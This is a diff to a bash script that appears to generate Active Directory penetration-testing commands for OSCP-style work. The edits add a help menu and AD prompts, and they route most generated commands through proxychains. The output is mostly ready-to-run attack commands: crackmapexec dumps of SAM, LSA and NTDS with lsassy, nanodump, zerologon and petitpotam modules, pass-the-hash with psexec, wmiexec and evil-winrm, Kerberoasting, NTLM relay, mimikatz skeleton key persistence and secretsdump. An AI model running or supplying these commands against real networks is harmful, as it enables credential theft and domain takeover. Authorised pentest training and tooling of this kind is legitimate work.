@@ -16,7 +16,7 @@ logo(){
 	echo -e "\e[96m \e[0m ";
 	echo -e "\e[96m              Follow me on twitter: @xmakamx \e[0m ";
 	echo
-	echo "   Syntax: bash oscpcmd.sh"
+	echo "   Syntax: ./oscpcmd.sh | Help: ./oscpcmd.sh -h"
 }
 logo
 
@@ -24,6 +24,70 @@ logo
 bold=$(tput bold)
 normal=$(tput sgr0)
 date=$(TZ="CET" date '+%Y-%m-%d-%H-%M-%S')
+
+if [ ! -d $scriptlocation/vars ]; then
+	mkdir $scriptlocation/vars
+fi
+
+if [ ! -d $scriptlocation/nmap ]; then
+	mkdir $scriptlocation/nmap
+fi
+
+Help()
+{
+echo -e "\e[96m" 
+echo "   Explanation:"
+echo   
+echo "   This tool semi-auto-generates commands for you based on the input of variables"
+echo
+echo "   1. The local adapter can be /eth/tun0 or any other name for your adapter"
+echo "   6. Additionally: when you want to input the IP of your pentestbox, use the manual option 6"
+echo
+echo "   2. There can only be 1 active host. Adjust when needed e.g. when pivoting"
+echo
+echo "   3. The mulitple host section let's you define a scope"
+echo
+echo "   4. The Set AD Server automatically queries the scope for AD presence"
+echo
+echo "   5. The Set Credentials allows for you to set: Username/Password/LM:NT hash"
+echo
+echo "   6. You will be asked a bunch of questions for Host/IP/FQDN/Suffix and Credentials"
+echo
+echo "   7. Prefix the most important and usable commands with the 'proxychains' command"
+echo
+echo "   8. This menu allows you to use the bunch of tools pre-generated on information above"
+echo -e "\e[0m "
+echo "   9. Quit and say goodbye"
+echo
+echo -e "\e[31m ${bold}  The Tooling menu:\e[30m ${normal}"
+echo -e "\e[32m"
+echo "   In Menu 8 you will find various tools and submenu's to craft commands for use"
+echo
+echo "   This menu is based on de AD Pentesting MindMap Graphic by orange-cyberdefense"
+echo
+echo "   Serveral tools are listed in the vulnerable, repositories and the Help section"
+echo
+echo "   Diverse tooling can be found in each menu with their description respectfully"
+echo
+echo "   Menu 15,16 are the Web Server en MSFconsole sections which requires your attention"
+echo
+echo "   I hope to have been of help and you can report any errors on: https://github.com/xmakamx/enum-oscp/issues"
+echo
+echo -e "\e[0m "
+
+
+}
+
+while getopts ":h,--help" option; do
+   case $option in
+      h | --help)
+         Help
+         exit;;
+
+   esac
+done
+
+
 
 SETIP() {
 echo "   [+] The following IP will be used: `cat $scriptlocation/vars/ip.txt`"
@@ -123,6 +187,15 @@ cat nmap/ADserver.nmap | grep "Domain:" | awk '{print $10}' | sed 's/,//g' | sed
 Choices
 }
 
+SetProxyChains(){
+
+touch $scriptlocation/vars/proxychains.txt
+read -p "Enter the command 'proxychains', Enter nothing to clear:"$'\n' proxychains
+
+echo $proxychains > $scriptlocation/vars/proxychains.txt
+Choices
+}
+
 ManualSet(){
 
 touch $scriptlocation/vars/ip.txt
@@ -136,7 +209,7 @@ read -p "Please Enter the Active Target IP:"$'\n' ActiveHost
 echo $ActiveHost > $scriptlocation/vars/ActiveHost.txt
 
 touch $scriptlocation/vars/IPscope.txt
-read -p "Please Enter the IP Addresses in one line , or ; seperated:"$'\n' IPscope
+read -p "Please Enter the Scope IP Addresses in one line , or ; seperated:"$'\n' IPscope
 
 echo $IPscope | sed 's/, /\n/g' | sed 's/,/\n/g' | sed 's/;/\n/g' | sed 's/^"//' | sed 's/"$//' | sed 's/ /\n/g' > $scriptlocation/vars/IPscope.txt
 
@@ -154,11 +227,27 @@ touch $scriptlocation/vars/ADHostname.txt
 read -p "Please Enter the AD Hostname:"$'\n' ADHostname
 
 echo $ADHostname > $scriptlocation/vars/ADHostname.txt
+echo $ADHostname > $scriptlocation/vars/ADdns.txt
+
+touch $scriptlocation/vars/ADIP.txt
+read -p "Please Enter the AD IP:"$'\n' ADIP
+
+echo $ADIP > $scriptlocation/vars/ADIP.txt
 
 touch $scriptlocation/vars/ADsuffix.txt
-read -p "Please Enter the valid AD suffix:"$'\n' ADsuffix
+read -p "Please Enter the valid AD domain (e.g. dc=domain,dc=local):"$'\n' ADsuffix
 
 echo $ADsuffix > $scriptlocation/vars/ADsuffix.txt
+
+touch $scriptlocation/vars/ADdomain.txt
+read -p "Please Enter the valid AD domain (e.g. domain.local):"$'\n' ADdomain
+
+echo $ADdomain > $scriptlocation/vars/ADdomain.txt
+
+touch $scriptlocation/vars/fqdn.txt
+read -p "Please Enter the valid FQDN for the AD (e.g. SRV1.domain.local):"$'\n' fqdn
+
+echo $fqdn > $scriptlocation/vars/fqdn.txt
 
 touch $scriptlocation/vars/hash.txt
 read -p "Please Enter the valid hash in LM:NT format :"$'\n' hash
@@ -167,6 +256,11 @@ echo $hash > $scriptlocation/vars/hash.txt
 
 touch $scriptlocation/vars/nthash.txt
 cat $scriptlocation/vars/hash.txt | cut -f2 -d':' > $scriptlocation/vars/nthash.txt
+
+touch $scriptlocation/vars/proxychains.txt
+read -p "Enter the command 'proxychains', Enter nothing to clear:"$'\n' proxychains
+
+echo $proxychains > $scriptlocation/vars/proxychains.txt
 
 ReconstructVars
 Choices
@@ -188,6 +282,7 @@ touch $scriptlocation/vars/msfvenom.txt
 touch $scriptlocation/vars/reverseport.txt
 touch $scriptlocation/vars/hash.txt
 touch $scriptlocation/vars/nthash.txt
+touch $scriptlocation/vars/proxychains.txt
 
 }
 FuncTouch
@@ -212,6 +307,7 @@ MSFVENOM=$(cat $scriptlocation/vars/msfvenom.txt)
 PORT=$(cat $scriptlocation/vars/reverseport.txt)
 HASH=$(cat $scriptlocation/vars/hash.txt)
 NTHash=$(cat $scriptlocation/vars/nthash.txt)
+ProxyChains=$(cat $scriptlocation/vars/proxychains.txt)
 }
 
 
@@ -234,6 +330,8 @@ echo "   nmap -Pn --top-ports 50 --open ${ActiveHost}"
 echo
 echo "   nmap -Pn --script smb-vuln* -p139,445 ${ActiveHost}"
 echo
+echo "  $ProxyChains nmap -sT -Pn -v -iL ${ActiveHost}" 
+echo
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] All Multiple Hosts ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
@@ -248,6 +346,7 @@ echo "   sudo nmap -Pn -p- -sU -T4 -iL $IPScope -oA ~/workfolder/nmap/UDPAllHost
 echo
 echo "   sudo nmap -Pn -p- -sU -sC -sV -T4 -iL $IPScope -oA ~/workfolder/nmap/UDPAllHostsAllServicesAllPorts"   
 echo
+
 }
 
 CrackMapExecNull() {
@@ -259,23 +358,23 @@ echo -e "\e[96m ${bold}    [+] Single Host ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
 echo "   crackmapexec smb $ActiveHost"
 echo "   [+] ANONYMOUS" 
-echo "   crackmapexec smb $ActiveHost -u anonymous -p ''"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u anonymous -p ''"
 echo "   [+] NULL SESSION" 
-echo "   crackmapexec smb $ActiveHost -u '' -p ''"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u '' -p ''"
 echo
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Multiple Hosts ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
 echo "   crackmapexec smb $IPScope" 
 echo "   [+] # ANONYMOUS"
-echo "   crackmapexec smb $IPScope -u anonymous -p ''"
+echo "  $ProxyChains crackmapexec smb $IPScope -u anonymous -p ''"
 echo "   [+] # NULL SESSION" 
-echo "   crackmapexec smb $IPScope -u '' -p ''"
+echo "  $ProxyChains crackmapexec smb $IPScope -u '' -p ''"
 }
 
 RPCclient(){
-echo "   rpcclient -N -U \"\" -L \\\\$ActiveHost"
-echo "   rpcclient $> enumdomusers"
+echo "  $ProxyChains rpcclient -N -U \"\" -L \\\\$ActiveHost"
+echo "  $ProxyChains rpcclient $> enumdomusers"
 }
 
 FindADIP(){
@@ -287,26 +386,26 @@ echo "   dig axfr $ADdomain@$ADIP"
 }
 
 Enum4Linux(){
-echo "   enum4linux -a -u \"\" -p \"\" $ADIP" 
-echo "   enum4linux -a -u \"guest\" -p \"\" $ADIP"
+echo "  $ProxyChains enum4linux -a -u \"\" -p \"\" $ADIP" 
+echo "  $ProxyChains enum4linux -a -u \"guest\" -p \"\" $ADIP"
 }
 
 SMBMap() {
-echo "   smbmap -u \"\" -p \"\" -P 445 -H $ActiveHost"
-echo "   smbmap -u \"guest\" -p \"\" -P 445 -H $ActiveHost"
+echo "  $ProxyChains smbmap -u \"\" -p \"\" -P 445 -H $ActiveHost"
+echo "  $ProxyChains smbmap -u \"guest\" -p \"\" -P 445 -H $ActiveHost"
 }
 
 SMBClient(){
-echo "   smbclient -N -U \"\" -L \\\\$ActiveHost"
-echo "   smbclient -U \'%\' -l //$ADIP"
-echo "   smbclient -U \'guest%\' -L //$ADIP"
+echo "  $ProxyChains smbclient -N -U "" -L \\\\$ActiveHost"
+echo "  $ProxyChains smbclient -U '%'  -l //$ADIP"
+echo "  $ProxyChains smbclient -U 'guest%' -L //$ADIP"
 }
 
 LDAPsearch(){
-echo "   ldapsearch -v -x -D \"anonymous\" -w \'\' -H ldap://$ADIP -b \"$ADsuffix\""
-echo "   ldapsearch -v -x -D \"anonymous\" -w \'\' -H ldap://$ADIP -b \"$ADsuffix\" | grep \"userPrincipalName\""
-echo "   ldapsearch -v -x -D \"anonymous\" -w \'\' -H ldap://$ADIP -b \"$ADsuffix\" | grep \"sAMAccountName\\|userPrincipalName\\|DefaultPassword\""
-echo "   nmap -n -sV --script "ldap* and not brute" -p -389 $ADIP"
+echo "  $ProxyChains ldapsearch -v -x -D \"anonymous\" -w '' -H ldap://$ADIP -b \"$ADsuffix\""
+echo "  $ProxyChains ldapsearch -v -x -D \"anonymous\" -w '' -H ldap://$ADIP -b \"$ADsuffix\" | grep \"userPrincipalName\""
+echo "  $ProxyChains ldapsearch -v -x -D \"anonymous\" -w '' -H ldap://$ADIP -b \"$ADsuffix\" | grep \"sAMAccountName\\|userPrincipalName\\|DefaultPassword\""
+echo "  $ProxyChains nmap -n -sV --script "ldap* and not brute" -p -389 $ADIP"
 }
 
 MenuPentestingAD(){
@@ -359,14 +458,14 @@ echo
 echo "   searchsploit <product>"
 echo
 echo "   MS14-025:"
-echo "   findstr /S /l cpassword \\\\$FQDN\\sysvol\\$ADdomain\\policies\\*.xml"
+echo "  $ProxyChains findstr /S /l cpassword \\\\$FQDN\\sysvol\\$ADdomain\\policies\\*.xml"
 echo
 echo "   GetGPPPassword.py:"
 echo "   # with cleartext credentials" 
-echo "   python3 /opt/impacket/examples/Get-GPPPassword.py $ADdomain/$ActiveUsername:'$ActivePass'@$FQDN"
+echo "  $ProxyChains python3 /opt/impacket/examples/Get-GPPPassword.py $ADdomain/$ActiveUsername:'$ActivePass'@$FQDN"
 echo
 echo "   # pass-the-hash (with an NT hash)"
-echo "   python3 /opt/impacket/examples/Get-GPPPassword.py -hashes :$NThash $ADdomain/$ActiveUsername@$FQDN"
+echo "  $ProxyChains python3 /opt/impacket/examples/Get-GPPPassword.py -hashes :$NThash $ADdomain/$ActiveUsername@$FQDN"
 echo 
 echo "   use admin/mssql/mssql_enum_sql_logins"
 echo
@@ -399,58 +498,89 @@ echo "   List modules"
 echo "   crackmapexec smb -u '' -p '' -L" 
 echo
 echo "   Local Authorization >"
-echo "   crackmapexec smb $ActiveHost -u <USERLIST> -p '<PASS>' --local-auth"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --pass-pol"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --users" 
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --groups"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --sam"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --lsa"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u <USERLIST> -p '<PASS>' --local-auth"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --pass-pol"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --users" 
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --groups"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --sam"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --lsa"
 echo
 echo "   Domain user:"
-echo "   crackmapexec smb $ActiveHost -u <USERLIST> -p '<PASS>' -d $ADdomain"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --pass-pol"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --users" 
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --groups" 
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --lsa"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M spooler"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M zerologon"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M petitpotam"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M ms17-010"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M nanodump"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M gpp_autologin"
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M dfscoerce"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u <USERLIST> -p '<PASS>' -d $ADdomain"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --pass-pol"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --users" 
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --groups" 
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --lsa"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M spooler"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M zerologon"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M petitpotam"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M ms17-010"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M nanodump"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M gpp_autologin"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M dfscoerce"
 
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] CME Multiple Hosts ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
 echo "   Local Authorization >"
-echo "   crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' --local-auth"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --pass-pol"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --users" 
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --groups"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --sam"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --lsa"
+echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' --local-auth"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --pass-pol"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --users" 
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --groups"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --sam"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --lsa"
 
 echo
 echo "   Domain user:"
-echo "   crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' -d $ADdomain"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --pass-pol"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --users" 
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --groups" 
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --lsa"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M spooler"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M zerologon"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M petitpotam"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M ms17-010"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M nanodump"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M gpp_autologin"
-echo "   crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M dfscoerce"
+echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' -d $ADdomain"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --pass-pol"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --users" 
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --groups" 
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --lsa"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M spooler"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M zerologon"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M petitpotam"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M ms17-010"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M nanodump"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M gpp_autologin"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M dfscoerce"
 echo
+
+echo "   -----------------------------------------------------------------------------------------   "
+echo -e "\e[96m ${bold}    [+] CME Multiple Hosts with Hash ${normal}"
+echo "   -----------------------------------------------------------------------------------------   "
+echo
+echo "   Local Authorization >"
+echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' --local-auth"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --pass-pol"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --users" 
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --groups"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --sam"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --lsa"
+
+echo
+echo "   Domain user:"
+echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' -d $ADdomain"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --pass-pol"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --users" 
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --groups" 
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --sam"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --lsa"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M lsassy"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M spooler"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M zerologon"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M petitpotam"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M ms17-010"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M nanodump"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M gpp_autologin"
+echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M dfscoerce"
+echo
+
 }
 
 SharpHound(){
@@ -462,16 +592,16 @@ echo "   ! Rever to Menu WebServer for serving file !"
 }
 
 Enum4LinuxCred(){
-echo "   enum4linux -u '$ActiveUsername' -p '$ActivePass' -P ${ActiveHost}"
+echo "  $ProxyChains enum4linux -u '$ActiveUsername' -p '$ActivePass' -P ${ActiveHost}"
 }
 
 AsRepRoasting(){
-echo "   python3 /opt/impacket/examples/GetNPUsers.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername"
+echo "  $ProxyChains python3 /opt/impacket/examples/GetNPUsers.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername"
 echo "   README: https://github.com/HarmJ0y/ASREPRoast"
 }
 
 KerbeRoasting(){
-echo "   python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername"
+echo "  $ProxyChains python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername"
 echo "   README: hhttps://room362.com/post/2016/kerberoast-pt1/"
 }
 
@@ -535,7 +665,7 @@ echo "   https://github.com/itm4n/PrintSpoofer"
 }
 
 PrintNightMare(){
-echo "   impacket-rpcdump $ADIP | egrep \'MS-RPRN|MS-PAR\'"
+echo "   impacket-rpcdump $ADIP | egrep 'MS-RPRN|MS-PAR'"
 }
 
 RoquePotato(){
@@ -647,11 +777,11 @@ PassTheHash(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    Pass the Hash ${normal}" 
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   python3 /opt/impacket/examples/psexec.py -hashes \":$NTHash\" $ActiveUsername@$ActiveHost"
-echo "   python3 /opt/impacket/examples/wmiexec.py -hashes \":$NTHash\" $ActiveUsername@$ActiveHost"
-echo "   python3 /opt/impacket/examples/atexec.py -hashes \":$NTHash\" $ActiveUsername@$ActiveHost"
-echo "   evil-winrm -i $ActiveHost -u $ActiveUsername -H \":$NTHash\""
-echo "   xfreerdp /u:$ActiveUsername /d:$ADdomain /pth:$NTHash /v:@$ActiveHost"
+echo "  $ProxyChains python3 /opt/impacket/examples/psexec.py -hashes :$NTHash $ActiveUsername@$ActiveHost"
+echo "  $ProxyChains python3 /opt/impacket/examples/wmiexec.py -hashes :$NTHash $ActiveUsername@$ActiveHost"
+echo "  $ProxyChains python3 /opt/impacket/examples/atexec.py -hashes :$NTHash $ActiveUsername@$ActiveHost"
+echo "  $ProxyChains evil-winrm -i $ActiveHost -u $ActiveUsername -H :$NTHash"
+echo "  $ProxyChains xfreerdp /u:$ActiveUsername /d:$ADdomain /pth:$NTHash /v:@$ActiveHost"
 }
 
 OverPassTheHash(){
@@ -659,13 +789,13 @@ echo "   -----------------------------------------------------------------------
 echo -e "\e[96m ${bold}    OverPass the Hash ${normal}" 
 echo "   -----------------------------------------------------------------------------------------   "
 echo "   a1)"
-echo "   /opt/impacket/examples/getTGT.py $ADdomain/$ActiveUsername -hashes :$NTHash"
+echo "  $ProxyChains /opt/impacket/examples/getTGT.py $ADdomain/$ActiveUsername -hashes :$NTHash"
 echo "   a2)"
-echo "   export KRB5CCNAME=/tmp/domain_ticket.ccache"
+echo "  $ProxyChains export KRB5CCNAME=/tmp/domain_ticket.ccache"
 echo "   a3)"
-echo "   /opt/impacket/examples/psexec.py $ADdomain/$ActiveUsername@$ActiveHost -i -no-pass"
+echo "  $ProxyChains /opt/impacket/examples/psexec.py $ADdomain/$ActiveUsername@$ActiveHost -i -no-pass"
 echo "   b1)"
-echo "   Rubeus asktgt /user:$$ActiveUsername /rc4:<rc4value>"
+echo "  $ProxyChains Rubeus asktgt /user:$$ActiveUsername /rc4:<rc4value>"
 echo "   b2a)"
 echo "   Rubues ptt /ticket:<ticket>"
 echo "   b2a)"
@@ -800,7 +930,7 @@ echo "   -----------------------------------------------------------------------
 echo -e "\e[96m ${bold}    LAPS Password: ${normal}" 
 echo "   -----------------------------------------------------------------------------------------   "
 echo "   Get-LAPSPasswords -DomainController $ADIP -Credential $ADdomain\\$ActiveUsername | Format-Table -Autosize"
-echo "   crackmapexec ldap $ADIP -d $domain -u $ActiveUsername -p $ActivePass --module laps"
+echo "  $ProxyChains crackmapexec ldap $ADIP -d $domain -u $ActiveUsername -p $ActivePass --module laps"
 echo "   msfconsole: use post/windows/gather/credentials/enum_laps"
 echo "   foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -new $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}"
 echo
@@ -822,7 +952,7 @@ echo "   SMB LDAP(S): printerbug.py '$ADdomain/$ActiveUsername:$ActivePass'@<Pri
 echo "   SMB LDAP(S): sudo python3 /opt/impacket/examples/ntlmrelayx.py -t ldaps://$ADIP --remove-mic --add-computer <computer_name> <computerpassword> --delegate-access -smb2support"
 echo "   SMB LDAP(S): sudo python3 /opt/impacket/examples/ntlmrelayx.py --remove-mic --escalate-user $ActiveUsername -t ldap://$FQDN -smb2support"
 echo "   HTTP LDAPS: PetitPotam: https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py"
-echo "   HTTP LDAPS: PetitPotam: PetitPotam.py <attacker_netbios_name>@80a.txt <target_ip> # could be done with spooler too"
+echo "   HTTP LDAPS: PetitPotam: python3 Petitpotam.py <attacking machine’s IP> <target Domain Controller’s IP>"
 echo "   HTTP LDAPS: Webclient Service is started on target (or coerced with SearchConnector-ms)"
 echo
 echo "   -----------------------------------------------------------------------------------------   "
@@ -953,6 +1083,8 @@ echo "   mimikatz \"kerberos::golden /user:<current_user_sid> /sid:<domain_sid> 
 echo
 echo "   Directory Service Restore Mode (DSRM)"
 echo "   PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminBehavior\" -Value 2 - PropertyType DWORD"
+echo "   if exists:"
+echo "   PowerShell Sew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminBehavior\" -Value 2 - PropertyType DWORD"
 echo
 echo "   Skeleton Key:"
 echo "   mimikatz \"privileged::debug\" \"misc::skeleton\" exit"
@@ -971,12 +1103,12 @@ ReconstructVars
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] CrackMapExec NTDS.dit ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --ntds"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --ntds"
 echo "   Additionally: --ntds [{drsuapi,vss}]"
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Secretsdump.py ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   python3 /opt/impacket/examples/secretsdump.py '$ADdomain/$ActiveUsername:$ActivePass'@$ADIP"
